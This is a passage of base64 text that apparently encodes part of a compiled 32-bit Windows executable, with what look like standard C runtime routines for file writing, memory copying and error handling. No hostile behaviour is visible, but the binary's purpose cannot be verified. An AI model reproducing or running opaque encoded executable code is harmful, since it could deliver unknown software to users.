AACDxBBmg334CnQIag1YZokDQ0OLRfA5RRAPghv////rGIsPjXQOBPYGQHUFgA4C6whmiwBmiQNDQytd9Ild8OmR/v///xUY4EAAagVeO8Z1F+go5f//xwAJAAAA6DDl//+JMOlp/v//g/htD4VZ/v//iV3s6Vz+//8zwF9bXsnDahBowPpAAOgR8f//i0UIg/j+dRvo+OT//4MgAOjd5P//xwAJAAAAg8j/6b4AAAAz9jvGfAg7BYgrQQByIejP5P//iTDoteT//8cACQAAAFZWVlZW6D3k//+DxBTryYvIwfkFjRyNoCtBAIv4g+cfwecGiwsPvkw5BIPhAXS/uf///387TRAbyUF1FOiB5P//iTDoZ+T//8cAFgAAAOuwUOihUgAAWYl1/IsD9kQ4BAF0Fv91EP91DP91COh++f//g8QMiUXk6xboMeT//8cACQAAAOg55P//iTCDTeT/x0X8/v///+gJAAAAi0Xk6HDw///D/3UI6OtSAABZw4v/VYvsVot1FFcz/zv3dQQzwOtlOX0IdRvo4+P//2oWXokwV1dXV1fobOP//4PEFIvG60U5fRB0Fjl1DHIRVv91EP91COjKCAAAg8QM68H/dQxX/3UI6CkAAACDxAw5fRB0tjl1DHMO6JTj//9qIlmJCIvx661qFlhfXl3DzMzMzMzMzItUJAyLTCQEhdJ0aTPAikQkCITAdRaB+gABAAByDoM9fCtBAAB0BekyVQAAV4v5g/oEcjH32YPhA3QMK9GIB4PHAYPpAXX2i8jB4AgDwYvIweAQA8GLyoPiA8HpAnQG86uF0nQKiAeDxwGD6gF19otEJAhfw4tEJATDi/9Vi+y45BoAAOj3VgAAoQQQQQAzxYlF/ItFDFYz9omFNOX//4m1OOX//4m1MOX//zl1EHUHM8Dp6QYAADvGdSfo0OL//4kw6Lbi//9WVlZWVscAFgAAAOg+4v//g8QUg8j/6b4GAABTV4t9CIvHwfgFjTSFoCtBAIsGg+cfwecGA8eKWCQC29D7ibUo5f//iJ0n5f//gPsCdAWA+wF1MItNEPfR9sEBdSboZ+L//zP2iTDoS+L//1ZWVlZWxwAWAAAA6NPh//+DxBTpQwYAAPZABCB0EWoCagBqAP91COgXIAAAg8QQ/3UI6PMhAABZhcAPhJ0CAACLBvZEBwSAD4SQAgAA6E0cAACLQGwzyTlIFI2FHOX//w+UwVCLBv80B4mNIOX///8VeOBAAIXAD4RgAgAAM8k5jSDl//90CITbD4RQAgAA/xV04EAAi5005f//iYUc5f//M8CJhTzl//85RRAPhkIFAACJhUTl//+KhSfl//+EwA+FZwEAAIoLi7Uo5f//M8CA+QoPlMCJhSDl//+LBgPHg3g4AHQVilA0iFX0iE31g2A4AGoCjUX0UOtLD77BUOguMAAAWYXAdDqLjTTl//8rywNNEDPAQDvID4alAQAAagKNhUDl//9TUOiyLwAAg8QMg/j/D4SxBAAAQ/+FROX//+sbagFTjYVA5f//UOiOLwAAg8QMg/j/D4SNBAAAM8BQUGoFjU30UWoBjY1A5f//UVD/tRzl//9D/4VE5f///xVw4EAAi/CF9g+EXAQAAGoAjYU85f//UFaNRfRQi4Uo5f//iwD/NAf/FWzgQACFwA+EKQQAAIuFROX//4uNMOX//wPBObU85f//iYU45f//D4wVBAAAg70g5f//AA+EzQAAAGoAjYU85f//UGoBjUX0UIuFKOX//4sAxkX0Df80B/8VbOBAAIXAD4TQAwAAg7085f//AQ+MzwMAAP+FMOX///+FOOX//+mDAAAAPAF0BDwCdSEPtzMzyWaD/goPlMFDQ4OFROX//wKJtUDl//+JjSDl//88AXQEPAJ1Uv+1QOX//+gRUwAAWWY7hUDl//8PhWgDAACDhTjl//8Cg70g5f//AHQpag1YUImFQOX//+jkUgAAWWY7hUDl//8PhTsDAAD/hTjl////hTDl//+LRRA5hUTl//8Pgvn9///pJwMAAIsOihP/hTjl//+IVA80iw6JRA846Q4DAAAzyYsGA8f2QASAD4S/AgAAi4U05f//iY1A5f//hNsPhcoAAACJhTzl//85TRAPhiADAADrBou1KOX//4uNPOX//4OlROX//wArjTTl//+NhUjl//87TRBzOYuVPOX///+FPOX//4oSQYD6CnUQ/4Uw5f//xgANQP+FROX//4gQQP+FROX//4G9ROX///8TAABywovYjYVI5f//K9hqAI2FLOX//1BTjYVI5f//UIsG/zQH/xVs4EAAhcAPhEICAACLhSzl//8BhTjl//87ww+MOgIAAIuFPOX//yuFNOX//ztFEA+CTP///+kgAgAAiYVE5f//gPsCD4XRAAAAOU0QD4ZNAgAA6waLtSjl//+LjUTl//+DpTzl//8AK4005f//jYVI5f//O00Qc0aLlUTl//+DhUTl//8CD7cSQUFmg/oKdRaDhTDl//8Cag1bZokYQECDhTzl//8Cg4U85f//AmaJEEBAgb085f///hMAAHK1i9iNhUjl//8r2GoAjYUs5f//UFONhUjl//9Qiwb/NAf/FWzgQACFwA+EYgEAAIuFLOX//wGFOOX//zvDD4xaAQAAi4VE5f//K4U05f//O0UQD4I/////6UABAAA5TRAPhnwBAACLjUTl//+DpTzl//8AK4005f//agKNhUj5//9eO00QczyLlUTl//8PtxIBtUTl//8DzmaD+gp1DmoNW2aJGAPGAbU85f//AbU85f//ZokQA8aBvTzl//+oBgAAcr8z9lZWaFUNAACNjfDr//9RjY1I+f//K8GZK8LR+FCLwVBWaOn9AAD/FXDgQACL2DveD4SXAAAAagCNhSzl//9Qi8MrxlCNhDXw6///UIuFKOX//4sA/zQH/xVs4EAAhcB0DAO1LOX//zvef8vrDP8VGOBAAImFQOX//zvef1yLhUTl//8rhTTl//+JhTjl//87RRAPggr////rP2oAjY0s5f//Uf91EP+1NOX///8w/xVs4EAAhcB0FYuFLOX//4OlQOX//wCJhTjl///rDP8VGOBAAImFQOX//4O9OOX//wB1bIO9QOX//wB0LWoFXjm1QOX//3UU6D7c///HAAkAAADoRtz//4kw6z//tUDl///oStz//1nrMYu1KOX//4sG9kQHBEB0D4uFNOX//4A4GnUEM8DrJOj+2///xwAcAAAA6Abc//+DIACDyP/rDIuFOOX//yuFMOX//19bi038M81e6BXN///Jw2oQaOD6QADo4+f//4tFCIP4/nUb6Mrb//+DIADor9v//8cACQAAAIPI/+mdAAAAM/87x3wIOwWIK0EAciHoodv//4k46Ifb///HAAkAAABXV1dXV+gP2///g8QU68mLyMH5BY0cjaArQQCL8IPmH8HmBosLD75MMQSD4QF0v1DolEkAAFmJffyLA/ZEMAQBdBb/dRD/dQz/dQjoLvj//4PEDIlF5OsW6CTb///HAAkAAADoLNv//4k4g03k/8dF/P7////oCQAAAItF5Ohj5///w/91COjeSQAAWcPMzMzMzMzMVYvsV1aLdQyLTRCLfQiLwYvRA8Y7/nYIO/gPgqQBAACB+QABAAByH4M9fCtBAAB0FldWg+cPg+YPO/5eX3UIXl9d6VtPAAD3xwMAAAB1FcHpAoPiA4P5CHIq86X/JJUETkAAkIvHugMAAACD6QRyDIPgAwPI/ySFGE1AAP8kjRROQACQ/ySNmE1AAJAoTUAAVE1AAHhNQAAj0YoGiAeKRgGIRwGKRgLB6QKIRwKDxgODxwOD+QhyzPOl/ySVBE5AAI1JACPRigaIB4pGAcHpAohHAYPGAoPHAoP5CHKm86X/JJUETkAAkCPRigaIB4PGAcHpAoPHAYP5CHKI86X/JJUETkAAjUkA+01AAOhNQADgTUAA2E1AANBNQADITUAAwE1AALhNQACLRI7kiUSP5ItEjuiJRI/oi0SO7IlEj+yLRI7wiUSP8ItEjvSJRI/0i0SO+IlEj/iLRI78iUSP/I0EjQAAAAAD8AP4/ySVBE5AAIv/FE5AABxOQAAoTkAAPE5AAItFCF5fycOQigaIB4tFCF5fycOQigaIB4pGAYhHAYtFCF5fycONSQCKBogHikYBiEcBikYCiEcCi0UIXl/Jw5CNdDH8jXw5/PfHAwAAAHUkwekCg+IDg/kIcg3986X8/ySVoE9AAIv/99n/JI1QT0AAjUkAi8e6AwAAAIP5BHIMg+ADK8j/JIWkTkAA/ySNoE9AAJC0TkAA2E5AAABPQACKRgMj0YhHA4PuAcHpAoPvAYP5CHKy/fOl/P8klaBPQACNSQCKRgMj0YhHA4pGAsHpAohHAoPuAoPvAoP5CHKI/fOl/P8klaBPQACQikYDI9GIRwOKRgKIRwKKRgHB6QKIRwGD7gOD7wOD+QgPglb////986X8/ySVoE9AAI1JAFRPQABcT0AAZE9AAGxPQAB0T0AAfE9AAIRPQACXT0AAi0SOHIlEjxyLRI4YiUSPGItEjhSJRI8Ui0SOEIlEjxCLRI4MiUSPDItEjgiJRI8Ii0SOBIlEjwSNBI0AAAAAA/AD+P8klaBPQACL/7BPQAC4T0AAyE9AANxPQACLRQheX8nDkIpGA4hHA4tFCF5fycONSQCKRgOIRwOKRgKIRwKLRQheX8nDkIpGA4hHA4pGAohHAopGAYhHAYtFCF5fycNqDGgA+0AA6Jvj//+LdQiF9nR1gz2EK0EAA3VDagToZzcAAFmDZfwAVujyTAAAWYlF5IXAdAlWUOgWTQAAWVnHRfz+////6AsAAACDfeQAdTf/dQjrCmoE6FM2AABZw1ZqAP81pChBAP8VfOBAAIXAdRboEdf//4vw/xUY4EAAUOjB1v//iQZZ6F/j///Di/9Vi+xWi3UIV1bou0QAAFmD+P90UKGgK0EAg/4BdQn2gIQAAAABdQuD/gJ1HPZARAF0FmoC6JBEAABqAYv46IdEAABZWTvHdBxW6HtEAABZUP8VJOBAAIXAdQr/FRjgQACL+OsCM/9W6NdDAACLxsH4BYsEhaArQQCD5h/B5gZZxkQwBACF/3QMV+iQ1v//WYPI/+sCM8BfXl3DahBoIPtAAOhx4v//i0UIg/j+dRvoWNb//4MgAOg91v//xwAJAAAAg8j/6Y4AAAAz/zvHfAg7BYgrQQByIegv1v//iTjoFdb//8cACQAAAFdXV1dX6J3V//+DxBTryYvIwfkFjRyNoCtBAIvwg+YfweYGiwsPvkwxBIPhAXS/UOgiRAAAWYl9/IsD9kQwBAF0Dv91COjL/v//WYlF5OsP6LrV///HAAkAAACDTeT/x0X8/v///+gJAAAAi0Xk6ADi///D/3UI6HtEAABZw4v/VYvsVot1CItGDKiDdB6oCHQa/3YI6O39//+BZgz3+///M8BZiQaJRgiJRgReXcOL/1WL7ItFCIsAgThjc23gdSqDeBADdSSLQBQ9IAWTGXQVPSEFkxl0Dj0iBZMZdAc9AECZAXUF6INVAAAzwF3CBABoHVJAAP8VTOBAADPAw4v/VYvsV7/oAwAAV/8VKOBAAP91CP8VgOBAAIHH6AMAAIH/YOoAAHcEhcB03l9dw4v/VYvs6KkEAAD/dQjo9gIAAP81ABVBAOjLDAAAaP8AAAD/0IPEDF3Di/9Vi+xoDOJAAP8VgOBAAIXAdBVo/OFAAFD/FYTgQACFwHQF/3UI/9Bdw4v/VYvs/3UI6Mj///9Z/3UI/xWI4EAAzGoI6G80AABZw2oI6IwzAABZw4v/VYvsVovw6wuLBoXAdAL/0IPGBDt1CHLwXl3Di/9Vi+xWi3UIM8DrD4XAdRCLDoXJdAL/0YPGBDt1DHLsXl3Di/9Vi+yDPbAsQQAAdBlosCxBAOjcPgAAWYXAdAr/dQj/FbAsQQBZ6McfAABoeOFAAGhg4UAA6KH///9ZWYXAdUJo5F5AAOimVQAAuFjhQADHBCRc4UAA6GP///+DPbQsQQAAWXQbaLQsQQDohD4AAFmFwHQMagBqAmoA/xW0LEEAM8Bdw2oYaED7QADor9///2oI6IszAABZg2X8ADPbQzkdbCNBAA+ExQAAAIkdaCNBAIpFEKJkI0EAg30MAA+FnQAAAP81qCxBAOhaCwAAWYv4iX3Yhf90eP81pCxBAOhFCwAAWYvwiXXciX3kiXXgg+4EiXXcO/dyV+ghCwAAOQZ07Tv3ckr/NugbCwAAi/joCwsAAIkG/9f/NagsQQDoBQsAAIv4/zWkLEEA6PgKAACDxAw5feR1BTlF4HQOiX3kiX3YiUXgi/CJddyLfdjrn2iI4UAAuHzhQADoX/7//1lokOFAALiM4UAA6E/+//9Zx0X8/v///+gfAAAAg30QAHUoiR1sI0EAagjouTEAAFn/dQjo/P3//zPbQ4N9EAB0CGoI6KAxAABZw+jV3v//w4v/VYvsagBqAP91COjD/v//g8QMXcOL/1WL7GoAagH/dQjorf7//4PEDF3DagFqAGoA6J3+//+DxAzDagFqAWoA6I7+//+DxAzDi/9W6B0KAACL8FboLVYAAFbo4TsAAFboa9D//1boDFYAAFbo91UAAFbo31MAAFbo/gEAAFbohFIAAGgjVUAA6G8JAACDxCSjABVBAF7Di/9Vi+xRUVOLXQhWVzP2M/+Jffw7HP0IFUEAdAlHiX38g/8Xcu6D/xcPg3cBAABqA+jqWAAAWYP4AQ+ENAEAAGoD6NlYAABZhcB1DYM9ABBBAAEPhBsBAACB+/wAAAAPhEEBAABoyOdAALsUAwAAU79wI0EAV+g9WAAAg8QMhcB0DVZWVlZW6LzP//+DxBRoBAEAAL6JI0EAVmoAxgWNJEEAAP8VkOBAAIXAdSZosOdAAGj7AgAAVuj7VwAAg8QMhcB0DzPAUFBQUFDoeM///4PEFFbo8h0AAEBZg/g8djhW6OUdAACD7jsDxmoDuYQmQQBorOdAACvIUVDoA1cAAIPEFIXAdBEz9lZWVlZW6DXP//+DxBTrAjP2aKjnQABTV+hpVgAAg8QMhcB0DVZWVlZW6BHP//+DxBSLRfz/NMUMFUEAU1foRFYAAIPEDIXAdA1WVlZWVujszv//g8QUaBAgAQBogOdAAFfot1QAAIPEDOsyavT/FYzgQACL2DvedCSD+/90H2oAjUX4UI00/QwVQQD/NugwHQAAWVD/NlP/FWzgQABfXlvJw2oD6G5XAABZg/gBdBVqA+hhVwAAWYXAdR+DPQAQQQABdRZo/AAAAOgp/v//aP8AAADoH/7//1lZw8OL/1WL7FFRVujBCQAAi/CF9g+ERgEAAItWXKHMFUEAV4t9CIvKUzk5dA6L2GvbDIPBDAPaO8ty7mvADAPCO8hzCDk5dQSLwesCM8CFwHQKi1gIiV38hdt1BzPA6fsAAACD+wV1DINgCAAzwEDp6gAAAIP7AQ+E3gAAAItOYIlN+ItNDIlOYItIBIP5CA+FuAAAAIsNwBVBAIs9xBVBAIvRA/k7130ka8kMi35cg2Q5CACLPcAVQQCLHcQVQQBCA9+DwQw703zii138iwCLfmQ9jgAAwHUJx0ZkgwAAAOtePZAAAMB1CcdGZIEAAADrTj2RAADAdQnHRmSEAAAA6z49kwAAwHUJx0ZkhQAAAOsuPY0AAMB1CcdGZIIAAADrHj2PAADAdQnHRmSGAAAA6w49kgAAwHUHx0ZkigAAAP92ZGoI/9NZiX5k6weDYAgAUf/Ti0X4WYlGYIPI/1tfXsnDocQ8QQAz0oXAdQW42PdAAA+3CGaD+SB3CWaFyXQnhdJ0G2aD+SJ1CTPJhdIPlMGL0UBA69tmg/kgdwpAQA+3CGaFyXXww4v/Vos1BCBBAFcz/4X2dRqDyP/prAAAAGaD+D10AUdW6CpWAABZjXRGAg+3BmaFwHXmU2oER1foSRoAAIvYWVmJHVQjQQCF23UFg8j/63SLNQQgQQDrRFbo8lUAAIv4R2aDPj1ZdDFqAlfoFhoAAFlZiQOFwHRQVldQ6GFVAACDxAyFwHQPM8BQUFBQUOgrzP//g8QUg8MEjTR+ZoM+AHW2/zUEIEEA6Bn2//+DJQQgQQAAgyMAxwWgLEEAAQAAADPAWVtfXsP/NVQjQQDo8/X//4MlVCNBAACDyP/r5Iv/VYvsUVYz0leLfQyJE4vxxwcBAAAAOVUIdAmLTQiDRQgEiTFmgzgidROLfQwzyYXSD5TBaiJAQIvRWesY/wOF9nQIZosIZokORkYPtwhAQGaFyXQ8hdJ1y2aD+SB0BmaD+Ql1v4X2dAYzyWaJTv6DZfwAM9JmORAPhMMAAAAPtwhmg/kgdAZmg/kJdQhAQOvtSEjr2mY5EA+EowAAADlVCHQJi00Ig0UIBIkx/wcz/0cz0usDQEBCZoM4XHT3ZoM4InU49sIBdSCDffwAdA2NSAJmgzkidQSLwesNM8kz/zlN/A+UwYlN/NHq6w9KhfZ0CGpcWWaJDkZG/wOF0nXtD7cIZoXJdCQ5Vfx1DGaD+SB0GWaD+Ql0E4X/dAuF9nQFZokORkb/A0BA64KF9nQHM8lmiQ5GRv8Di30M6TL///+LRQg7wnQCiRD/B19eycOL/1WL7FFRU1ZXaAQBAAC+iCZBAFYzwDPbU2ajkChBAP8VlOBAAKHEPEEAiTVgI0EAO8N0B4v4ZjkYdQKL/o1F/FBTjV34M8mLx+hg/v//i138WVmB+////z9zSotN+IH5////f3M/jQRZA8ADyTvBcjRQ6JkXAACL8FmF9nQnjUX8UI0MnlaNXfiLx+ge/v//i0X8SFmjQCNBAFmJNUgjQQAzwOsDg8j/X15bycOL/1b/FZzgQACL8DPJO/F1BDPAXsNmOQ50DkBAZjkIdflAQGY5CHXyK8ZAU0CL2FdT6C0XAACL+FmF/3UNVv8VmOBAAIvHX1tew1NWV+gx8P//g8QM6+b/JQTgQABqVGhg+0AA6CbX//8z/4l9/I1FnFD/FajgQADHRfz+////akBqIF5W6B4XAABZWTvHD4QUAgAAo6ArQQCJNYgrQQCNiAAIAADrMMZABACDCP/GQAUKiXgIxkAkAMZAJQrGQCYKiXg4xkA0AIPAQIsNoCtBAIHBAAgAADvBcsxmOX3OD4QKAQAAi0XQO8cPhP8AAACLOI1YBI0EO4lF5L4ACAAAO/58Aov+x0XgAQAAAOtbakBqIOiQFgAAWVmFwHRWi03gjQyNoCtBAIkBgwWIK0EAII2QAAgAAOsqxkAEAIMI/8ZABQqDYAgAgGAkgMZAJQrGQCYKg2A4AMZANACDwECLEQPWO8Jy0v9F4Dk9iCtBAHyd6waLPYgrQQCDZeAAhf9+bYtF5IsIg/n/dFaD+f50UYoDqAF0S6gIdQtR/xWk4EAAhcB0PIt14IvGwfgFg+YfweYGAzSFoCtBAItF5IsAiQaKA4hGBGigDwAAjUYMUOh7MwAAWVmFwA+EyQAAAP9GCP9F4EODReQEOX3gfJMz24vzweYGAzWgK0EAiwaD+P90C4P4/nQGgE4EgOtyxkYEgYXbdQVq9ljrCovDSPfYG8CDwPVQ/xWM4EAAi/iD//90Q4X/dD9X/xWk4EAAhcB0NIk+Jf8AAACD+AJ1BoBOBEDrCYP4A3UEgE4ECGigDwAAjUYMUOjlMgAAWVmFwHQ3/0YI6wqATgRAxwb+////Q4P7Aw+MZ/////81iCtBAP8VoOBAADPA6xEzwEDDi2Xox0X8/v///4PI/+gk1f//w4v/VriA+UAAvoD5QABXi/g7xnMPiweFwHQC/9CDxwQ7/nLxX17Di/9WuIj5QAC+iPlAAFeL+DvGcw+LB4XAdAL/0IPHBDv+cvFfXsOL/1WL7Fb/NRQWQQCLNbDgQAD/1oXAdCGhEBZBAIP4/3QXUP81FBZBAP/W/9CFwHQIi4D4AQAA6ye+cOhAAFb/FYDgQACFwHULVugU8///WYXAdBhoYOhAAFD/FYTgQACFwHQI/3UI/9CJRQiLRQheXcNqAOiH////WcOL/1WL7Fb/NRQWQQCLNbDgQAD/1oXAdCGhEBZBAIP4/3QXUP81FBZBAP/W/9CFwHQIi4D8AQAA6ye+cOhAAFb/FYDgQACFwHULVuiZ8v//WYXAdBhojOhAAFD/FYTgQACFwHQI/3UI/9CJRQiLRQheXcP/FbTgQADCBACL/1b/NRQWQQD/FbDgQACL8IX2dRv/NZgoQQDoZf///1mL8Fb/NRQWQQD/FbjgQACLxl7DoRAWQQCD+P90FlD/NaAoQQDoO////1n/0IMNEBZBAP+hFBZBAIP4/3QOUP8VvOBAAIMNFBZBAP/p3SUAAGoMaID7QADoH9P//75w6EAAVv8VgOBAAIXAdQdW6Nrx//9ZiUXki3UIx0Zc6OdAADP/R4l+FIXAdCRoYOhAAFCLHYTgQAD/04mG+AEAAGiM6EAA/3Xk/9OJhvwBAACJfnDGhsgAAABDxoZLAQAAQ8dGaCAWQQBqDeiRJgAAWYNl/AD/dmj/FcDgQADHRfz+////6D4AAABqDOhwJgAAWYl9/ItFDIlGbIXAdQihKBxBAIlGbP92bOi/DgAAWcdF/P7////oFQAAAOii0v//wzP/R4t1CGoN6FglAABZw2oM6E8lAABZw4v/Vlf/FRjgQAD/NRAWQQCL+OiR/v///9CL8IX2dU5oFAIAAGoB6DISAACL8FlZhfZ0Olb/NRAWQQD/NZwoQQDo6P3//1n/0IXAdBhqAFboxf7//1lZ/xXE4EAAg04E/4kG6wlW6DPu//9ZM/ZX/xUQ4EAAX4vGXsOL/1bof////4vwhfZ1CGoQ6Lfw//9Zi8Zew2oIaKj7QADopdH//4t1CIX2D4T4AAAAi0YkhcB0B1Do5u3//1mLRiyFwHQHUOjY7f//WYtGNIXAdAdQ6Mrt//9Zi0Y8hcB0B1DovO3//1mLRkCFwHQHUOiu7f//WYtGRIXAdAdQ6KDt//9Zi0ZIhcB0B1Doku3//1mLRlw96OdAAHQHUOiB7f//WWoN6AMlAABZg2X8AIt+aIX/dBpX/xXI4EAAhcB1D4H/IBZBAHQHV+hU7f//WcdF/P7////oVwAAAGoM6MokAABZx0X8AQAAAIt+bIX/dCNX6LENAABZOz0oHEEAdBSB/1AbQQB0DIM/AHUHV+i9CwAAWcdF/P7////oHgAAAFbo/Oz//1no4tD//8IEAIt1CGoN6JkjAABZw4t1CGoM6I0jAABZw4v/Vle+cOhAAFb/FYDgQACFwHUHVug57///WYv4hf8PhF4BAACLNYTgQABovOhAAFf/1miw6EAAV6OUKEEA/9ZopOhAAFejmChBAP/WaJzoQABXo5woQQD/1oM9lChBAACLNbjgQACjoChBAHQWgz2YKEEAAHQNgz2cKEEAAHQEhcB1JKGw4EAAo5goQQChvOBAAMcFlChBAPdfQACJNZwoQQCjoChBAP8VtOBAAKMUFkEAg/j/D4TMAAAA/zWYKEEAUP/WhcAPhLsAAADoa/H///81lChBAOgT+////zWYKEEAo5QoQQDoA/v///81nChBAKOYKEEA6PP6////NaAoQQCjnChBAOjj+v//g8QQo6AoQQDozyEAAIXAdGVo62FAAP81lChBAOg9+///Wf/QoxAWQQCD+P90SGgUAgAAagHoVA8AAIvwWVmF9nQ0Vv81EBZBAP81nChBAOgK+///Wf/QhcB0G2oAVujn+///WVn/FcTgQACDTgT/iQYzwEDrB+iS+///M8BfXsOL/1WL7DPAOUUIagAPlMBoABAAAFD/FczgQACjpChBAIXAdQJdwzPAQKOEK0EAXcOL/1WL7IPsEKEEEEEAg2X4AINl/ABTV79O5kC7uwAA//87x3QNhcN0CffQowgQQQDrYFaNRfhQ/xXg4EAAi3X8M3X4/xXc4EAAM/D/FcTgQAAz8P8V2OBAADPwjUXwUP8V1OBAAItF9DNF8DPwO/d1B75P5kC76wuF83UHi8bB4BAL8Ik1BBBBAPfWiTUIEEEAXl9bycODJYArQQAAw4v/VYvsUVGLRQxWi3UIiUX4i0UQV1aJRfzouy8AAIPP/1k7x3UR6N3B///HAAkAAACLx4vX60r/dRSNTfxR/3X4UP8VYOBAAIlF+DvHdRP/FRjgQACFwHQJUOjPwf//WevPi8bB+AWLBIWgK0EAg+YfweYGjUQwBIAg/YtF+ItV/F9eycNqFGjQ+0AA6JbN//+Dzv+JddyJdeCLRQiD+P51HOh0wf//gyAA6FnB///HAAkAAACLxovW6dAAAAAz/zvHfAg7BYgrQQByIehKwf//iTjoMMH//8cACQAAAFdXV1dX6LjA//+DxBTryIvIwfkFjRyNoCtBAIvwg+YfweYGiwsPvkwxBIPhAXUm6AnB//+JOOjvwP//xwAJAAAAV1dXV1fod8D//4PEFIPK/4vC61tQ6BcvAABZiX38iwP2RDAEAXQc/3UU/3UQ/3UM/3UI6Kn+//+DxBCJRdyJVeDrGuihwP//xwAJAAAA6KnA//+JOINN3P+DTeD/x0X8/v///+gMAAAAi0Xci1Xg6NnM///D/3UI6FQvAABZw4v/VYvs/wU4I0EAaAAQAADoSAwAAFmLTQiJQQiFwHQNg0kMCMdBGAAQAADrEYNJDASNQRSJQQjHQRgCAAAAi0EIg2EEAIkBXcOL/1WL7ItFCIP4/nUP6A/A///HAAkAAAAzwF3DVjP2O8Z8CDsFiCtBAHIc6PG///9WVlZWVscACQAAAOh5v///g8QUM8DrGovIg+AfwfkFiwyNoCtBAMHgBg++RAEEg+BAXl3DLaQDAAB0IoPoBHQXg+gNdAxIdAMzwMO4BAQAAMO4EgQAAMO4BAgAAMO4EQQAAMOL/1ZXi/BoAQEAADP/jUYcV1Do+tv//zPAD7fIi8GJfgSJfgiJfgzB4RALwY1+EKurq7kgFkEAg8QMjUYcK86/AQEAAIoUAYgQQE91942GHQEAAL4AAQAAihQIiBBATnX3X17Di/9Vi+yB7BwFAAChBBBBADPFiUX8U1eNhej6//9Q/3YE/xXk4EAAvwABAACFwA+E+wAAADPAiIQF/P7//0A7x3L0ioXu+v//xoX8/v//IITAdC6Nne/6//8PtsgPtgM7yHcWK8FAUI2UDfz+//9qIFLoN9v//4PEDEOKA0OEwHXYagD/dgyNhfz6////dgRQV42F/P7//1BqAWoA6GpMAAAz21P/dgSNhfz9//9XUFeNhfz+//9QV/92DFPoS0oAAIPERFP/dgSNhfz8//9XUFeNhfz+//9QaAACAAD/dgxT6CZKAACDxCQzwA+3jEX8+v//9sEBdA6ATAYdEIqMBfz9///rEfbBAnQVgEwGHSCKjAX8/P//iIwGHQEAAOsIxoQGHQEAAABAO8dyvutWjYYdAQAAx4Xk+v//n////zPJKYXk+v//i5Xk+v//jYQOHQEAAAPQjVogg/sZdwyATA4dEIrRgMIg6w+D+hl3DoBMDh0gitGA6iCIEOsDxgAAQTvPcsKLTfxfM81b6Nyu///Jw2oMaPD7QADoqsn//+ja9///i/ihRBtBAIVHcHQdg39sAHQXi3dohfZ1CGog6Ibo//9Zi8bowsn//8NqDehYHQAAWYNl/ACLd2iJdeQ7NUgaQQB0NoX2dBpW/xXI4EAAhcB1D4H+IBZBAHQHVuie5f//WaFIGkEAiUdoizVIGkEAiXXkVv8VwOBAAMdF/P7////oBQAAAOuOi3Xkag3oHRwAAFnDi/9Vi+yD7BBTM9tTjU3w6Cu///+JHagoQQCD/v51HscFqChBAAEAAAD/FezgQAA4Xfx0RYtN+INhcP3rPIP+/XUSxwWoKEEAAQAAAP8V6OBAAOvbg/78dRKLRfCLQATHBagoQQABAAAA68Q4Xfx0B4tF+INgcP2LxlvJw4v/VYvsg+wgoQQQQQAzxYlF/FOLXQxWi3UIV+hk////i/gz9ol9CDv+dQ6Lw+i3/P//M8DpnQEAAIl15DPAObhQGkEAD4SRAAAA/0Xkg8AwPfAAAABy54H/6P0AAA+EcAEAAIH/6f0AAA+EZAEAAA+3x1D/FfDgQACFwA+EUgEAAI1F6FBX/xXk4EAAhcAPhDMBAABoAQEAAI1DHFZQ6FfY//8z0kKDxAyJewSJcww5VegPhvgAAACAfe4AD4TPAAAAjXXvig6EyQ+EwgAAAA+2Rv8PtsnppgAAAGgBAQAAjUMcVlDoENj//4tN5IPEDGvJMIl14I2xYBpBAIl15OsqikYBhMB0KA+2Pg+2wOsSi0XgioBMGkEACEQ7HQ+2RgFHO/h26ot9CEZGgD4AddGLdeT/ReCDxgiDfeAEiXXkcumLx4l7BMdDCAEAAADoZ/v//2oGiUMMjUMQjYlUGkEAWmaLMUFmiTBBQEBKdfOL8+jX+///6bf+//+ATAMdBEA7wXb2RkaAfv8AD4U0////jUMeuf4AAACACAhASXX5i0ME6BL7//+JQwyJUwjrA4lzCDPAD7fIi8HB4RALwY17EKurq+uoOTWoKEEAD4VY/v//g8j/i038X14zzVvo16v//8nDahRoEPxAAOilxv//g03g/+jR9P//i/iJfdzo3Pz//4tfaIt1COh1/f//iUUIO0MED4RXAQAAaCACAADoRQYAAFmL2IXbD4RGAQAAuYgAAACLd2iL+/OlgyMAU/91COi4/f//WVmJReCFwA+F/AAAAIt13P92aP8VyOBAAIXAdRGLRmg9IBZBAHQHUOh64v//WYleaFOLPcDgQAD/1/ZGcAIPheoAAAD2BUQbQQABD4XdAAAAag3o2RkAAFmDZfwAi0MEo7goQQCLQwijvChBAItDDKPAKEEAM8CJReSD+AV9EGaLTEMQZokMRawoQQBA6+gzwIlF5D0BAQAAfQ2KTBgciIhAGEEAQOvpM8CJReQ9AAEAAH0QiowYHQEAAIiISBlBAEDr5v81SBpBAP8VyOBAAIXAdROhSBpBAD0gFkEAdAdQ6MHh//9ZiR1IGkEAU//Xx0X8/v///+gCAAAA6zBqDehSGAAAWcPrJYP4/3UggfsgFkEAdAdT6Ivh//9Z6A25///HABYAAADrBINl4ACLReDoXcX//8ODPawsQQAAdRJq/ehW/v//WccFrCxBAAEAAAAzwMOL/1WL7FNWi3UIi4a8AAAAM9tXO8N0bz14HkEAdGiLhrAAAAA7w3ReORh1WouGuAAAADvDdBc5GHUTUOgS4f///7a8AAAA6IxIAABZWYuGtAAAADvDdBc5GHUTUOjx4P///7a8AAAA6CZIAABZWf+2sAAAAOjZ4P///7a8AAAA6M7g//9ZWYuGwAAAADvDdEQ5GHVAi4bEAAAALf4AAABQ6K3g//+LhswAAAC/gAAAACvHUOia4P//i4bQAAAAK8dQ6Izg////tsAAAADogeD//4PEEI2+1AAAAIsHPbgdQQB0FzmYtAAAAHUPUOgMRgAA/zfoWuD//1lZjX5Qx0UIBgAAAIF/+EgbQQB0EYsHO8N0CzkYdQdQ6DXg//9ZOV/8dBKLRwQ7w3QLORh1B1DoHuD//1mDxxD/TQh1x1boD+D//1lfXltdw4v/VYvsU1aLNcDgQABXi30IV//Wi4ewAAAAhcB0A1D/1ouHuAAAAIXAdANQ/9aLh7QAAACFwHQDUP/Wi4fAAAAAhcB0A1D/1o1fUMdFCAYAAACBe/hIG0EAdAmLA4XAdANQ/9aDe/wAdAqLQwSFwHQDUP/Wg8MQ/00IddaLh9QAAAAFtAAAAFD/1l9eW13Di/9Vi+xXi30Ihf8PhIMAAABTVos1yOBAAFf/1ouHsAAAAIXAdANQ/9aLh7gAAACFwHQDUP/Wi4e0AAAAhcB0A1D/1ouHwAAAAIXAdANQ/9aNX1DHRQgGAAAAgXv4SBtBAHQJiwOFwHQDUP/Wg3v8AHQKi0MEhcB0A1D/1oPDEP9NCHXWi4fUAA